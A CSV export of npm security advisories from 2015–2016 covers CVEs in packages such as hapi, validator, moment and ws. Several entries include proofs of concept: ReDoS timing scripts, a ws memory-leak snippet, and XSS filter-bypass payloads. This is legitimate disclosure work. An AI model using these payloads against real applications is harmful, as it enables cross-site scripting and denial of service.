81,2016-01-28T07:56:29.271Z,2019-06-24T15:17:06.197Z,,Authentication Bypass,hapi-auth-jwt2,['CVE-2016-10525'],5.1.1,>=5.1.2,Versions of `hapi-auth-jwt2` prior to version 5.1.2 are affected by a complete authentication bypass vulnerability when in the `try` authentication mode. ,Update to version 5.1.2 or later.,"- [Issue #111](https://github.com/dwyl/hapi-auth-jwt2/issues/111)
- [PR #112](https://github.com/dwyl/hapi-auth-jwt2/pull/112)",public,critical,CWE-287,Alan Shaw,Alan Shaw,"Jan 28th, 2016",,,,
80,2016-01-25T17:56:30.822Z,2018-02-26T22:51:09.237Z,,Denial of Service and Content Injection,i18n-node-angular,['CVE-2016-10524'],<1.4.0,>=1.4.0,"Versions of `i18n-node-angular` prior to 1.4.0 are affected by denial of service and cross-site scripting vulnerabilities. The vulnerabilities exist in a REST endpoint that was created for development purposes, but was not disabled in production in affected versions.",Update to version 1.4.0 or later.,[Commit #877720d](https://github.com/oliversalzburg/i18n-node-angular/commit/877720d2d9bb90dc8233706e81ffa03f99fc9dc8),public,high,CWE-730,Garth Boyd,Garth Boyd,"Jan 25th, 2016",,,,
77,2016-01-19T21:50:30.175Z,2018-02-26T22:47:26.285Z,,Regular Expression Denial of Service,hawk,['CVE-2016-2515'],< 3.1.3  || >= 4.0.0 <4.1.1,>=3.1.3 < 4.0.0 || >=4.1.1,"Versions of `hawk` prior to 3.1.3, or 4.x prior to 4.1.1 are affected by a regular expression denial of service vulnerability related to excessively long headers and URI's.
",Update to hawk version 4.1.1 or later.,[Issue #168](https://github.com/hueniverse/hawk/issues/168),public,moderate,CWE-400,Adam Baldwin,Adam Baldwin,"Jan 19th, 2016",,,,
76,2016-01-17T21:04:10.998Z,2018-02-26T22:40:29.762Z,,Regular Expression Denial of Service,is-my-json-valid,['CVE-2016-2537'],<=2.12.3,>=2.12.4,Versions of `is-my-json-valid` prior to 2.12.4 are affected by a regular expression denial of service vulnerability when user input is allowed into a `utc-millisec` validator.,Update to version 2.12.4 or later.,,public,moderate,CWE-400,Adam Baldwin,Adam Baldwin,"Jan 17th, 2016",,,,
75,2016-01-15T17:00:45.333Z,2019-06-24T15:17:17.254Z,,Denial of Service,mqtt-packet,['CVE-2016-10523'],<3.4.6 || > 4.0.0 <4.0.5,>=3.4.6 < 4.0.0|| >=4.0.5,"Versions of `mqtt-packet` prior to 3.4.6, or 4.x prior to 4.0.5 are affected by a denial of service vulnerability wherein specific sequences of MQTT packets can crash the application.

","Version 3.x: Update to version 3.4.6 or later.
Version 4.x: Update to version 4.0.5 or later.
","- [PR #8](https://github.com/mqttjs/mqtt-packet/pull/8)
- [Issue #393](https://github.com/mcollina/mosca/issues/393)",public,high,CWE-730,Peter Sorowka,Peter Sorowka,"Jan 15th, 2016",,,,
74,2016-01-11T22:27:08.020Z,2020-07-31T21:18:14.081Z,,Content Injection via TileJSON Name,mapbox.js,['CVE-2017-1000043'],<1.6.6 || < 2.2.4 > 2.0.0,>=1.6.6 <2.0.0 || >= 2.2.4,"Versions 1.x prior to 1.6.6 and 2.x prior to 2.2.4 of `mapbox.js` are vulnerable to a cross-site-scripting attack in certain uncommon usage scenarios.

If `L.mapbox.map` or `L.mapbox.shareControl` are used in a manner that gives users control of the TileJSON content, it is possible to inject script content into the name value of the TileJSON. After clicking on the share control, the malicious code will execute in the context of the page using Mapbox.js.
","Version 1.x: Update to version 1.6.6 or later.
Version 2.x: Update to version 2.2.4 or later.
",[HackerOne Bug Report #99245](https://hackerone.com/reports/99245),public,moderate,CWE-94,"Alexandra Ulsh, Abdullah Ahmet Erdem","Alexandra Ulsh, Abdullah Ahmet Erdem","Jan 11th, 2016",,,,
68,2016-01-04T19:52:12.937Z,2018-02-26T22:28:51.791Z,,Remote Memory Disclosure,bittorrent-dht,['CVE-2016-10519'],<5.1.3,>=5.1.3,"Versions of `bittorrent-dht` prior to 5.1.3 are affected by a remote memory disclosure vulnerability. This vulnerability allows an attacker to send a specific series of of messages to a listening peer and get it to reveal internal memory.


There are two mitigating factors here, that slightly reduce the impact of this vulnerability:

1. Any modern kernel will zero out new memory pages before handing them off to a process. This means that only memory previously used and deallocated by the node process can be leaked.
1. Node.js manages Buffers by creating a few large internal SlowBuffers, and slicing them up into smaller Buffers which are made accessible in JS. They are not stored on V8's heap, because garbage collection would interfere. The result is that only memory that has been previously allocated as a Buffer can be leaked.",Update to version 5.1.3 or later.,[Issue #87](https://github.com/feross/bittorrent-dht/issues/87),public,moderate,CWE-201,Feross Aboukhadijeh / Mathias Buss Madsen,Feross Aboukhadijeh / Mathias Buss Madsen,"Jan 4th, 2016",,,,
67,2016-01-04T18:29:33.009Z,2019-06-24T15:13:55.396Z,,Remote Memory Disclosure,ws,['CVE-2016-10518'],<= 1.0.0,>= 1.0.1,"Versions of `ws` prior to 1.0.1 are affected by a remote memory disclosure vulnerability.

In certain rare circumstances, applications which allow users to control the arguments of a `client.ping()` call will cause `ws` to send the contents of an allocated but non-zero-filled buffer to the server. This may disclose sensitive information that still exists in memory after previous use of the memory for other tasks.



## Proof of Concept
```
var ws = require('ws')

var server = new ws.Server({ port: 9000 })
var client = new ws('ws://localhost:9000')

client.on('open', function () {
  console.log('open')
  client.ping(50) // this sends a non-zeroed buffer of 50 bytes

  client.on('pong', function (data) {
    console.log('got pong')
    console.log(data) // Data from the client. 
  })
})
```",Update to version 1.0.1 or greater.,"- [Release 1.0.1](https://github.com/websockets/ws/releases/tag/1.0.1)
- [Additional Details from Stuart Larsen](https://gist.github.com/c0nrad/e92005446c480707a74a)",public,low,CWE-201,Feross Aboukhadijeh / Mathias Buss,Feross Aboukhadijeh / Mathias Buss,"Jan 4th, 2016",,,,
66,2015-12-28T18:37:19.938Z,2019-06-24T14:54:43.988Z,,SQL Injection,mysql,['CVE-2015-9244'],<=v2.0.0-alpha7,>=v2.0.0-alpha8,"Versions of `mysql` prior to 2.0.0-alpha8 are affected by a SQL Injection vulnerability in the `mysql.escape()` function, which does not properly escape object keys.",Update to version 2.0.0-alpha8 or later.,- [Issue #324](https://github.com/felixge/node-mysql/issues/342),public,moderate,CWE-89,Sébastian Dejonghe,Sébastian Dejonghe,"Dec 28th, 2015",,,,
65,2015-12-28T17:13:59.814Z,2018-02-26T22:10:12.738Z,,Unsafe Merging of CORS Configuration Conflict,hapi,['CVE-2015-9243'],<11.1.4,>=11.1.4,"Versions of `hapi` prior to 11.1.4 are affected by a vulnerability that causes route-level CORS configuration to override connection-level or server-level CORS defaults. This may result in a situation where CORS permissions are less restrictive than intended.

",Update hapi to version 11.1.4 or later.,[Issue #2980](https://github.com/hapijs/hapi/issues/2980),public,moderate,CWE-null,Eran Hammer,Eran Hammer,"Dec 28th, 2015",,,,
64,2015-12-23T22:29:19.290Z,2019-06-24T15:17:49.443Z,,Denial of Service,ecstatic,['CVE-2015-9242'],<1.4.0,>=1.4.0,"Versions of `ecstatic` prior to 1.4.0 are affected by a denial of service vulnerability when certain input strings are sent via the `Last-Modified` or `If-Modified-Since` headers.

Parsing certain inputs with `new Date()` or `Date.parse()` cases v8 to crash. As ecstatic passes the value of the affected headers into one of these functions, sending certain inputs via one of the headers will cause the server to crash.
",Update to version 1.4.0 or later.,"- [PR #179]https://github.com/jfhbrook/node-ecstatic/pull/179
- [V8 Bug Tracker - Bug #4640]https://bugs.chromium.org/p/v8/issues/detail?id=4640",public,high,CWE-730,James Halliday,James Halliday,"Dec 23rd, 2015",,,,
63,2015-12-23T22:04:46.097Z,2019-06-24T15:14:25.278Z,,Denial of Service,hapi,['CVE-2015-9241'],<11.1.3,>=11.1.3,"Versions of `hapi` prior to 11.1.3 are affected by a denial of service vulnerability.

The vulnerability is triggered when certain input is passed into the If-Modified-Since or Last-Modified headers.

This causes an 'illegal access' exception to be raised, and instead of sending a HTTP 500 error back to the sender, hapi will continue to hold the socket open until timed out (default node timeout is 2 minutes).


",Update to v11.1.3 or later,"- [Commit #aab2496](https://github.com/hapijs/hapi/commit/aab2496e930dce5ee1ab28eecec94e0e45f03580)
- [PR #179](https://github.com/jfhbrook/node-ecstatic/pull/179)

Special thanks to [James Halliday](https://github.com/substack) for bringing this exception pattern to our attention via the [ecstatic advisory](https://nodesecurity.io/advisories/64) which lead to identifying this.",public,high,CWE-730,Adam Baldwin,Adam Baldwin,"Dec 23rd, 2015",,,,
62,2015-12-14T17:05:06.592Z,2018-02-26T21:54:28.175Z,,Cross-Site Scripting,mustache,['CVE-2015-8862'],<2.2.1,>=2.2.1,"Versions of `mustache` prior to 2.2.1 are affected by a cross-site scripting vulnerability when attributes in mustache templates are not quoted.



### Example
Template:
```<a href={{foo}}/>```

Input:
```{ 'foo' : 'test.com onload=alert(1)'}```

Rendered result:
```<a href=test.com onload=alert(1)/>```","Update to version 2.2.1 or later.
Alternatively, ensure that all attributes in hmustache templates are encapsulated with quotes.",[Commit #378bcca](https://github.com/janl/mustache.js/commit/378bcca8a5cfe4058f294a3dbb78e8755e8e0da5),public,high,CWE-79,Matias P. Brutti,Matias P. Brutti,"Dec 14th, 2015",,,,
61,2015-12-14T16:51:56.173Z,2019-06-24T15:19:06.409Z,,Cross-Site Scripting,handlebars,['CVE-2015-8861'],<4.0.0,>=4.0.0,"Versions of `handlebars` prior to 4.0.0 are affected by a cross-site scripting vulnerability when attributes in handlebar templates are not quoted.


## Proof of Concept
Template:
```<a href={{foo}}/>```

Input:
```{ 'foo' : 'test.com onload=alert(1)'}```

Rendered result:
```<a href=test.com onload=alert(1)/>```","Update to version 4.0.0 or later.
Alternatively, ensure that all attributes in handlebars templates are encapsulated with quotes.","- [SourceClear - Handlebars Research Findings](https://blog.srcclr.com/handlebars_vulnerability_research_findings/)
- [PR #1083](https://github.com/wycats/handlebars.js/pull/1083)",public,high,CWE-79,Matias P. Brutti,Matias P. Brutti,"Dec 14th, 2015",,,,
60,2015-12-04T16:56:49.010Z,2018-02-26T20:13:39.232Z,,Authentication Weakness,keystone,['CVE-2015-9240'],<0.3.16,>=0.3.16,"Versions of `keystone` prior to 0.3.16 are affected by a partial authentication bypass vulnerability. In the default sign in functionality, if an attacker provides a full and correct password, yet only provides part of the associated email address, authentication will be granted.",Update to version 0.3.16 or later.,,public,low,CWE-287,Greg Meyer,Greg Meyer,"Dec 4th, 2015",,,,
59,2015-11-20T18:52:47.394Z,2020-05-04T20:17:12.899Z,,Regular Expression Denial of Service,millisecond,['CVE-2015-8315'],<0.1.2,>=0.1.2,"Versions of `millisecond` prior to 0.1.2 are affected by a regular expression denial of service vulnerability when extremely long version strings are parsed.


## Proof of concept
```
var ms = require('millisecond');
var genstr = function (len, chr) {
   var result = """";
   for (i=0; i<=len; i++) {
       result = result + chr;
   }

   return result;
}

ms(genstr(process.argv[2], ""5"") + "" minutea"");
```",Update to version 0.1.2 or later.,"[PR #4](https://github.com/unshiftio/millisecond/pull/4)
",public,moderate,CWE-400,Luigi Pinca,Luigi Pinca,"Nov 20th, 2015",,,,
57,2015-11-03T07:15:12.900Z,2018-02-26T20:07:41.410Z,,Symlink Arbitrary File Overwrite,tar,['CVE-2015-8860'],<2.0.0,>=2.0.0,"Versions of `tar` prior to 2.0.0 are affected by an arbitrary file write vulnerability. The vulnerability occurs because `tar` does not verify that extracted symbolic links to not resolve to targets outside of the extraction root directory.
",Update to version 2.0.0 or later,[Release v2.7.5](https://github.com/npm/npm/releases/tag/v2.7.5),public,critical,CWE-59,Tim Cuthbertson,Tim Cuthbertson,"Nov 3rd, 2015",,,,
56,2015-11-03T07:12:20.676Z,2019-06-24T15:14:48.902Z,,Root Path Disclosure,send,['CVE-2015-8859'],<0.11.1,>=0.11.1,"Versions of `send` prior to 0.11.2 are affected by an information leakage vulnerability which may allow an attacker to enumerate paths on the server filesystem.
",Update to version 0.11.1 or later.,"- [PR #70](https://github.com/pillarjs/send/pull/70)
- [Express Changelog - 2015/01/20](https://github.com/expressjs/serve-static/blob/master/HISTORY.md#181--2015-01-20)",public,low,CWE-934,Dinis Cruz,Dinis Cruz,"Nov 3rd, 2015",,,,
55,2015-10-26T23:19:57.916Z,2018-02-26T20:01:56.207Z,,Regular Expression Denial of Service,moment,['CVE-2016-4055'],<2.11.2,>=2.11.2,"Versions of `moment` prior to 2.11.2 are affected by a regular expression denial of service vulnerability. The vulnerability is triggered when arbitrary user input is passed into `moment.duration()`.


## Proof of concept
```
var moment = require('moment');

var genstr = function (len, chr) {
    var result = """";
    for (i=0; i<=len; i++) {
        result = result + chr;
    }

    return result;
}


for (i=20000;i<=10000000;i=i+10000) {
    console.log(""COUNT: "" + i);
    var str = '-' + genstr(i, '1')
    console.log(""LENGTH: "" + str.length);
    var start = process.hrtime();
    moment.duration(str)

    var end = process.hrtime(start);
    console.log(end);
}
```

### Results
```
$ node moment.js
COUNT: 20000
LENGTH: 20002
[ 0, 618931029 ]
COUNT: 30001
LENGTH: 30003
[ 1, 401413894 ]
COUNT: 40002
LENGTH: 40004
[ 2, 437075303 ]
COUNT: 50003
LENGTH: 50005
[ 3, 824664804 ]
COUNT: 60004
LENGTH: 60006
[ 5, 651335262 ]
```",Please update to version 2.11.2 or later. ,,public,moderate,CWE-400,Adam Baldwin,Adam Baldwin,"Oct 26th, 2015",,,,
54,2015-10-26T16:58:39.517Z,2018-02-26T19:54:11.130Z,,Command Injection,gm,['CVE-2015-7982'],<=1.20.0,>=1.21.1,"Versions of `gm` prior to 1.21.1 are affected by a command injection vulnerability. The vulnerability is triggered when user input is passed into `gm.compare()`, which fails to sanitize input correctly before calling the graphics magic binary.",Update to version 1.21.1 or later.,[Commit #5f5c774](https://github.com/aheckmann/gm/commit/5f5c77490aa84ed313405c88905eb4566135be31),public,critical,CWE-94,Brendan Scarvell of Console,Brendan Scarvell of Console,"Oct 26th, 2015",,,,
53,2015-10-25T17:21:21.820Z,2019-06-24T21:13:07.833Z,,Regular Expression Denial of Service,jshamcrest,['CVE-2016-10521'],>=0.0.0,<0.0.0,"The `jshamcrest` package is affected by a regular expression denial of service vulnerability when certain types of user input are passed in to the emailAddress validator.


## Proof of concept

```
var js = require('jshamcrest')
var emailAddress = new js.JsHamcrest.Matchers.emailAddress();


var genstr = function (len, chr) {
    var result = """";
    for (i=0; i<=len; i++) {
        result = result + chr;
    }

    return result;
}


for (i=1;i<=10000000;i=i+1) {
    console.log(""COUNT: "" + i);
    var str = '66666666666666666666666666666@ffffffffffffffffffffffffffffffff.' + genstr(i, 'a') + '{'
    console.log(""LENGTH: "" + str.length);
    var start = process.hrtime();
    emailAddress.matches(str)

    var end = process.hrtime(start);
    console.log(end);
}
```

### Results
It takes about 116 characters to get a 1.6 second event loop block.
```
[ 1, 633084590 ]
COUNT: 51
LENGTH: 116
```

# Timeline
- October 25, 2015 - Vulnerability Identified
- October 25, 2015 - Maintainers notified (no response)","The `jshamcrest` package currently has no patched versions available.

At this time, the best available mitigation is to use an alternative module that is actively maintained and provides similar functionality. There are [multiple modules fitting this criteria available on npm.](https://www.npmjs.com/search?q=validator).",,public,high,CWE-400,Adam Baldwin,Adam Baldwin,"Oct 25th, 2015",,,,
52,2015-10-25T04:40:15.697Z,2019-06-24T21:12:53.891Z,,Regular Expression Denial of Service,jadedown,['CVE-2016-10520'],>=0.0.0,<0.0.0,"The `jadedown` package is affected by a regular expression denial of service vulnerability when certain types of user input are passed in.


### Proof of concept
```
var jadedown = require('jadedown');

var genstr = function (len, chr) {
    var result = """";
    for (i=0; i<=len; i++) {
        result = result + chr;
    }

    return result;
}


for (i=1;i<=10000000;i=i+1) {
    console.log(""COUNT: "" + i);
    var str = genstr(i, 'f') + genstr(i, '#') + '{';
    console.log(""LENGTH: "" + str.length);
    var start = process.hrtime();
    jadedown(str)

    var end = process.hrtime(start);
    console.log(end);
}

```

Results demonstrating blocking for 5 seconds using only 48 characters.

```
$ node jadedown.js
COUNT: 1
LENGTH: 6
[ 0, 4014065 ]
COUNT: 4
LENGTH: 12
[ 0, 503507 ]
COUNT: 7
LENGTH: 18
[ 0, 325225 ]
COUNT: 10
LENGTH: 24
[ 0, 1632684 ]
COUNT: 13
LENGTH: 30
[ 0, 7541230 ]
COUNT: 16
LENGTH: 36
[ 0, 80889495 ]
COUNT: 19
LENGTH: 42
[ 0, 636009936 ]
COUNT: 22
LENGTH: 48
[ 5, 820586760 ]
```

# Timeline
- October 24, 2015 - Vulnerability Identified
- October 24, 2015 - Maintainers Notified
- October 25, 2015 - Response from Maintainers with intent to fix
- January 5, 2016 - Advisory Published
- January 11, 2016 - CVE Requested","This package is not actively maintained, and has not seen an update since 2011. 

The package also provides unique functionality in the form of a templating language that is not available elsewhere. If this package is used to process user input, the best available mitigation is to refactor the dependent application to not make use of this module.

",,public,low,CWE-400,Adam Baldwin,Adam Baldwin,"Oct 25th, 2015",,,,
51,2015-10-25T01:35:01.611Z,2019-06-24T21:12:41.339Z,,Regular Expression Denial of Service,ansi2html,['CVE-2015-9239'],>=0.0.0,<0.0.0,"The `ansi2html` package is affected by a regular expression denial of service vulnerability when certain types of user input is passed in.


## Proof of concept
```
var ansi2html = require('ansi2html')

var start = process.hrtime();
ansi2html(""[1111111111111111111111;0000000000000000000000"");
console.log(process.hrtime(start));

start = process.hrtime();
ansi2html(""[1111111111111111111111;00000000000000000000000"");
console.log(process.hrtime(start));

start = process.hrtime();
ansi2html(""[1111111111111111111111;000000000000000000000000"");
console.log(process.hrtime(start));

start = process.hrtime();
ansi2html(""[1111111111111111111111;0000000000000000000000000000"");
console.log(process.hrtime(start));
```

Results of the above
```
00:29:53-adam_baldwin~/tmp$ node test
[ 0, 119615367 ]
[ 0, 149934565 ]
[ 0, 233325677 ]
[ 3, 46582479 ]
```","At the time of this writing, February 2018, all versions of `ansi2html` remain vulnerable, and the package has not been updated for 4 years. 

In order to use this package safely, it is necessary to avoid passing user input to the package, or to limit the size of the input string to a size with a parse time you find acceptable. Unfortunately, the match time grows at quite a small character count, so it is unlikely for it to both allow strings of a useful size while protecting against the denial of service attack. 

In the case that user input of significant length must be parsed by ansi2html, the best mitigation is to use an alternative module that is actively maintained and provides similar functionality. There are [multiple modules fitting this criteria available on npm.][available on npm](https://www.npmjs.com/search?q=ansi+html)
",,public,high,CWE-400,Adam Baldwin,Adam Baldwin,"Oct 25th, 2015",,,,
50,2015-10-24T18:09:30.429Z,2018-02-26T19:26:22.177Z,,Insecure Comparison,secure-compare,['CVE-2015-9238'],<=3.0.0,>3.0.0,"Versions of `secure-compare` prior to 3.0.1 are affected by a vulnerability that results in the package always returning true when comparing two strings of the same length, despite differences in the contents of those strings.",Upgrade to version 3.0.1 or later.,[PR #1](https://github.com/vdemedes/secure-compare/pull/1),public,high,CWE-697,Joshua Dague,Joshua Dague,"Oct 24th, 2015",,,,
49,2015-10-24T18:05:49.315Z,2020-08-07T20:44:49.481Z,,Content Injection via TileJSON attribute,mapbox.js,['CVE-2017-1000042'],<1.6.5 || < 2.1.7 > 2.0.0,>=1.6.5 <2.0.0 || >= 2.1.7,"Versions 1.x prior to 1.6.5 and 2.x prior to 2.1.7 of `mapbox.js` are vulnerable to a cross-site-scripting attack in certain uncommon usage scenarios.

If `L.mapbox.map` or `L.mapbox.tileLayer` are used to load untrusted TileJSON content from a non-Mapbox URL, it is possible for a malicious user with control over the TileJSON content to inject script content into the ""attribution"" value of the TileJSON which will be executed in the context of the page using Mapbox.js.
","Version 2.x: Update to version 2.1.7 or later.
Version 1.x: Update to version 1.6.5 or later.
",[HackerOne Report #54327](https://hackerone.com/reports/54327),public,moderate,CWE-94,"John Firebaugh, Juan Broullón Sampedro","John Firebaugh, Juan Broullón Sampedro","Oct 24th, 2015",,,,
48,2015-10-24T17:58:34.232Z,2018-02-24T00:59:58.129Z,,Regular Expression Denial of Service,uglify-js,['CVE-2015-8858'],<2.6.0,>=2.6.0,"Versions of `uglify-js` prior to 2.6.0 are affected by a regular expression denial of service vulnerability when malicious inputs are passed into the `parse()` method.


### Proof of Concept

```
var u = require('uglify-js');
var genstr = function (len, chr) {
    var result = """";
    for (i=0; i<=len; i++) {
        result = result + chr;
    }

    return result;
}

u.parse(""var a = "" + genstr(process.argv[2], ""1"") + "".1ee7;"");
```

### Results
```
$ time node test.js 10000
real	0m1.091s
user	0m1.047s
sys	0m0.039s

$ time node test.js 80000
real	0m6.486s
user	0m6.229s
sys	0m0.094s
```",Update to version 2.6.0 or later.,,public,low,CWE-400,Adam Baldwin,Adam Baldwin,"Oct 24th, 2015",,,,
47,2015-10-24T17:38:43.821Z,2019-06-24T21:11:37.446Z,,Regular Expression Denial of Service,bleach,['CVE-2014-8881'],>=0.0.0,<0.0.0,"All versions of the `bleach` package are vulnerable to a regular expression denial of service attack when certain types of input are passed into the sanitize function.
","The `bleach` package is not currently maintained, and has not seen an update since 2014. 

To mitigate this issue, it is necessary to use an alternative module that is actively maintained and provides similar functionality. There are [multiple modules fitting this criteria available on npm.](https://www.npmjs.com/search?q=html%20sanitizer&page=1&ranking=optimal).",,public,moderate,CWE-400,Adam Baldwin,Adam Baldwin,"Oct 24th, 2015",,,,
46,2015-10-24T16:06:54.122Z,2018-02-24T00:49:54.660Z,,Regular Expression Denial of Service,ms,['CVE-2015-8315'],<=0.7.0,>0.7.0,"Versions of `ms` prior to 0.7.1 are affected by a regular expression denial of service vulnerability when extremely long version strings are parsed.

## Proof of Concept
```javascript
var ms = require('ms');
var genstr = function (len, chr) {
   var result = """";
   for (i=0; i<=len; i++) {
       result = result + chr;
   }

   return result;
}

ms(genstr(process.argv[2], ""5"") + "" minutea"");

```

### Results
Showing increase in execution time based on the input string.
```
$ time node ms.js 10000

real	0m0.758s
user	0m0.724s
sys	0m0.031s

$ time node ms.js 20000

real	0m2.580s
user	0m2.494s
sys	0m0.047s

$ time node ms.js 30000

real	0m5.747s
user	0m5.483s
sys	0m0.080s

$ time node ms.js 80000

real	0m41.022s
user	0m38.894s
sys	0m0.529s
```
","Update to version 0.7.1 or later.
Alternatively, apply a reasonable length limit to parsed version strings.",,public,moderate,CWE-400,Adam Baldwin,Adam Baldwin,"Oct 24th, 2015",,,,
45,2015-10-20T18:29:09.702Z,2019-06-24T15:16:15.076Z,,Incorrect handling of CORS preflight request headers,hapi,['CVE-2015-9236'],<11.0.0,>=11.0.0,"Versions of `hapi` prior to 11.0.0 implement CORS incorrectly, allowing for configurations that at best return inconsistent headers, and at worst allow cross-origin activities that are expected to be forbidden. 

If the connection has CORS enabled but one route has it off, and the route is not GET, the OPTIONS prefetch request will return the default CORS headers and then the actual request will go through and return no CORS headers. This defeats the purpose of turning CORS on the route.",Update to version 11.0.0 or later.,"- [Issue #2850](https://github.com/hapijs/hapi/issues/2850)
- [Issue #2840](https://github.com/hapijs/hapi/issues/2840)",public,moderate,CWE-null,Eran Hammer,Eran Hammer,"Oct 20th, 2015",,,,
44,2015-10-17T19:41:46.382Z,2018-02-24T00:39:27.945Z,,Denial of Service,yar,['CVE-2014-4179'],<2.2.0,>=2.2.0,"Versions of `yar` prior to 2.2.0 are affected by a denial of service vulnerability related to an invalid encrypted session cookie value.

When an invalid encryped session cookie value is provided, the process will crash.",Update to version 2.2.0 or later.,[Issue #34](https://github.com/spumko/yar/issues/34),public,high,CWE-730,Reid Burke,Reid Burke,"Oct 17th, 2015",,,,
43,2015-10-17T19:41:46.382Z,2018-02-24T00:37:33.571Z,,XSS Filter Bypass via Encoded URL,validator,['CVE-2014-9772'],<2.0.0,>=2.0.0,"Versions of `validator` prior to 2.0.0 contained an xss filter method that is affected by several filter bypasses. This may result in a cross-site scripting vulnerability.


## Proof of Concept
The xss() function removes the word ""javascript"" when contained inside an attribute.

However, it does not properly handle cases where characters have been hex-encoded. 

As a result, it is possible to build an input that bypasses the filter but which the browser will accept as valid JavaScript.

For example:
```<a href=""jav&#x61;script:..."">abc</a>```
will render as:
```<a href=""javascript:..."">abc</a>```","The package author has decided to remove the xss filter functionality in the latest version of this module. If this feature is not currently being used, you are not affected by the vulnerability. If it is being used, updating to the latest version of the module will break your application.

In order for affected users to mitigate this vulnerability, it is necessary to use an [alternative package](https://www.npmjs.com/search?q=xss%20filter&page=1&ranking=optimal) that provides similar functionality.

","[Issue #181](https://github.com/chriso/validator.js/issues/181)
",public,high,CWE-79,taku0,taku0,"Oct 17th, 2015",,,,
42,2015-10-17T19:41:46.382Z,2019-06-24T15:21:27.465Z,,Regular Expression Denial of Service,validator,['CVE-2014-8882'],<3.22.1,>=3.22.1,Versions of `validator` prior to 3.22.1 are affected by a regular expression denial of service vulnerability in the `isURL` method.,Update to version 3.22.1 or later.,"- [Issue #152, Comment 48107184](https://github.com/chriso/validator.js/issues/152#issuecomment-48107184)",public,high,CWE-400,Karl Düüna,Karl Düüna,"Oct 17th, 2015",,,,
41,2015-10-17T19:41:46.382Z,2020-06-12T16:59:22.514Z,,Multiple XSS Filter Bypasses,validator,"['CVE-2013-7451', 'CVE-2013-7452', 'CVE-2013-7453', 'CVE-2013-7454']",<1.1.0,>=1.1.0,"Versions of `validator` prior to 1.1.0 are affected by several cross-site scripting vulnerabilities due to bypasses discovered in the denylist-based filter.


## Proof of Concept
Various inputs that could bypass the filter were discovered:

Improper parsing of nested tags:

```
<s <onmouseover=""alert(1)""> <;s onmouseover=""alert(1)"">This is a test</s>
```

Incomplete filtering of javascript: URIs:

```
<a href=""javascriptJ a V a S c R iPt::alert(1)"" ""<s>"">test</a>
```

UI Redressing:

```
<div style=""z-index: 9999999; background-color: green; width: 100%; height: 100%"">
<h1>You have won</h1>Please click the link and enter your login details:
<a href=""http://example.com/"">http://good.com</a>
</div>
```

Bypass via Nested Forbidden Strings:

```
<scrRedirecRedirect 302t 302ipt type=""text/javascript"">prompt(1);</scrRedirecRedirect 302t 302ipt>
```

Additional bypasses were discovered by Krzysztof Kotowicz in 2012 when auditing CodeIgniter's XSS filtering function, which this code was based off of.","If you are a developer currently using the xss filter function from the validator package, you should consider replacing it with the escape filter function from the same package. This function replaces all instances of angle brackets (<, >), ampersands, and quotation marks, so no HTML tags will be processed.","- [XSS Filter Bypass in validator Node.js Module](https://nealpoole.com/blog/2013/07/xss-filter-bypass-in-validator-nodejs-module/)
- [CodeIgniter <= 2.1.1 xss_clean() Cross Site Scripting filter bypass](http://blog.kotowicz.net/2012/07/codeigniter-210-xssclean-cross-site.html)",public,critical,CWE-79,"Neal Poole, Krzysztof Kotowicz","Neal Poole, Krzysztof Kotowicz","Oct 17th, 2015",,,,
40,2015-10-17T19:41:46.382Z,2019-06-24T14:54:14.904Z,,Command Injection,ungit,['CVE-2015-4130'],<=0.8.4,>=0.9.0,Versions of `ungit` prior to 0.9.0 are affected by a command injection vulnerability in the `url` parameter.,Update version 0.9.0 or later.,- [Issue #486](https://github.com/FredrikNoren/ungit/issues/486),public,critical,CWE-94,CodingTwinky,CodingTwinky,"Oct 17th, 2015",,,,
39,2015-10-17T19:41:46.382Z,2019-06-14T23:28:21.694Z,,Incorrect Handling of Non-Boolean Comparisons During Minification,uglify-js,['CVE-2015-8857'],<= 2.4.23,>= 2.4.24,"Versions of `uglify-js` prior to 2.4.24 are affected by a vulnerability which may cause crafted JavaScript to have altered functionality after minification.

",Upgrade UglifyJS to version >= 2.4.24.,"- [Backdooring JS - Yan Zhu(@bcrypt)](https://zyan.scripts.mit.edu/blog/backdooring-js/)
- [Issue #751](https://github.com/mishoo/UglifyJS2/issues/751)",public,low,CWE-95,Tom MacWright,Tom MacWright,"Oct 17th, 2015",,,,
